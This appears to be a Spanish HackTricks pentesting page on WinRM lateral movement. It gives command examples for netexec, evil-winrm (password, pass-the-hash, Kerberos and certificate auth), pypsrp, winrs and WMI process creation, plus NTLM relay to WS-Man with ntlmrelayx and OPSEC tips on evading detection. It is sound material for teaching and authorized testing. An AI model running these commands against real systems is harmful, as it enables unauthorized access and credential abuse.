# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM es uno de los transportes de **lateral movement** más convenientes en entornos Windows porque te da una shell remota sobre **WS-Man/HTTP(S)** sin necesitar trucos de creación de servicios SMB. Si el objetivo expone **5985/5986** y tu principal está autorizado a usar remoting, a menudo puedes pasar de "valid creds" a "interactive shell" muy rápido.

Para la **protocol/service enumeration**, listeners, habilitar WinRM, `Invoke-Command` y el uso genérico del cliente, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por qué a los operadores les gusta WinRM

- Usa **HTTP/HTTPS** en lugar de SMB/RPC, así que a menudo funciona donde se bloquea la ejecución estilo PsExec.
- Con **Kerberos**, evita enviar credenciales reutilizables al objetivo.
- Funciona bien desde tooling de **Windows**, **Linux** y **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- La ruta interactiva de PowerShell remoting crea **`wsmprovhost.exe`** en el objetivo bajo el contexto del usuario autenticado, lo que operativamente es distinto de la ejecución basada en servicios.

## Modelo de acceso y prerrequisitos

En la práctica, el lateral movement exitoso por WinRM depende de **tres** cosas:

1. El objetivo tiene un **WinRM listener** (`5985`/`5986`) y reglas de firewall que permiten el acceso.
2. La cuenta puede **autenticarse** en el endpoint.
3. La cuenta tiene अनुमति para **abrir una sesión de remoting**.

Formas comunes de obtener ese acceso:

- **Local Administrator** en el objetivo.
- Pertenencia a **Remote Management Users** en sistemas más nuevos o a **WinRMRemoteWMIUsers__** en sistemas/componentes que todavía respetan ese grupo.
- Derechos de remoting explícitos delegados mediante descriptores de seguridad locales / cambios en ACL de PowerShell remoting.

Si ya controlas una máquina con privilegios de admin, recuerda que también puedes **delegar acceso a WinRM sin pertenecer al grupo de administradores completo** usando las técnicas descritas aquí:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Problemas de autenticación importantes durante el lateral movement

- **Kerberos requiere un hostname/FQDN**. Si te conectas por IP, el cliente normalmente hace fallback a **NTLM/Negotiate**.
- En casos límite de **workgroup** o entre trusts cruzados, NTLM normalmente requiere **HTTPS** o que el objetivo se añada a **TrustedHosts** en el cliente.
- Con **cuentas locales** sobre Negotiate en un workgroup, las restricciones remotas de UAC pueden impedir el acceso salvo que se use la cuenta Administrator integrada o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por defecto el **`HTTP/<host>` SPN**. En entornos donde `HTTP/<host>` ya está registrado para otra cuenta de servicio, WinRM Kerberos puede fallar con `0x80090322`; usa un SPN con puerto o cambia a **`WSMAN/<host>`** donde ese SPN exista.

Si consigues credenciales válidas durante password spraying, validarlas por WinRM suele ser la forma más rápida de comprobar si se traducen en una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux a Windows

### NetExec / CrackMapExec para validación y ejecución de un solo paso
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interactivas

`evil-winrm` sigue siendo la opción interactiva más conveniente desde Linux porque soporta **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferencia de archivos y carga en memoria de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso límite de Kerberos SPN: `HTTP` vs `WSMAN`

Cuando el SPN predeterminado **`HTTP/<host>`** causa fallos de Kerberos, intenta solicitar/usar un ticket **`WSMAN/<host>`** en su lugar. Esto aparece en entornos empresariales endurecidos o extraños donde `HTTP/<host>` ya está asociado a otra cuenta de servicio.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Esto también es útil después del abuso de **RBCD / S4U** cuando específicamente forjaste o solicitaste un ticket de servicio **WSMAN** en lugar de un ticket genérico `HTTP`.

### Certificate-based authentication

WinRM también soporta **client certificate authentication**, pero el certificado debe estar mapeado en el destino a una **local account**. Desde una perspectiva ofensiva, esto importa cuando:

- ya robaste/exportaste un certificado de cliente válido y su clave privada ya mapeados para WinRM;
- abusaste de **AD CS / Pass-the-Certificate** para obtener un certificado para un principal y luego pivotar a otro path de autenticación;
- estás operando en entornos que evitan deliberadamente el remoting basado en contraseñas.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM es mucho menos común que la autenticación por password/hash/Kerberos, pero cuando existe puede proporcionar una ruta de **lateral movement sin password** que sobrevive a la rotación de passwords.

### Python / automatización con `pypsrp`

Si necesitas automatización en lugar de una shell de operador, `pypsrp` te ofrece WinRM/PSRP desde Python con soporte para **NTLM**, **certificate auth**, **Kerberos** y **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Movimiento lateral de WinRM nativo de Windows

### `winrs.exe`

`winrs.exe` está integrado y es útil cuando quieres **ejecución nativa de comandos WinRM** sin abrir una sesión interactiva de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operativamente, `winrs.exe` suele dar lugar a una cadena de procesos remota similar a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Esto vale la pena recordarlo porque difiere de exec basado en servicios y de sesiones PSRP interactivas.

### `winrm.cmd` / WS-Man COM en lugar de PowerShell remoting

También puedes ejecutar a través de **WinRM transport** sin `Enter-PSSession` invocando clases WMI sobre WS-Man. Esto mantiene el transport como WinRM mientras que el primitive de ejecución remota pasa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Ese enfoque es útil cuando:

- PowerShell logging está muy monitorizado.
- Quieres **WinRM transport** pero no un flujo de trabajo clásico de PS remoting.
- Estás creando o usando tooling personalizado alrededor del objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Cuando SMB relay está bloqueado por signing y LDAP relay está restringido, **WS-Man/WinRM** puede seguir siendo un objetivo de relay atractivo. `ntlmrelayx.py` moderno incluye **WinRM relay servers** y puede hacer relay a targets **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dos notas prácticas:

- Relay es más útil cuando el objetivo acepta **NTLM** y el principal relayed tiene permiso para usar WinRM.
- El código reciente de Impacket maneja específicamente solicitudes **`WSMANIDENTIFY: unauthenticated`** para que los probes estilo `Test-WSMan` no rompan el flujo del relay.

Para restricciones multi-hop después de conseguir una primera sesión de WinRM, revisa:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas de OPSEC y detección

- El **PowerShell remoting** interactivo suele crear **`wsmprovhost.exe`** en el objetivo.
- **`winrs.exe`** normalmente crea **`winrshost.exe`** y luego el proceso hijo solicitado.
- Espera telemetría de **network logon**, eventos del servicio WinRM y logging operacional/script-block de PowerShell si usas PSRP en lugar de `cmd.exe` en bruto.
- Si solo necesitas un único comando, `winrs.exe` o la ejecución WinRM de una sola vez pueden ser más silenciosos que una sesión interactiva de remoting de larga duración.
- Si Kerberos está disponible, prefiere **FQDN + Kerberos** en lugar de IP + NTLM para reducir tanto problemas de confianza como cambios incómodos de `TrustedHosts` del lado del cliente.

## Referencias

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
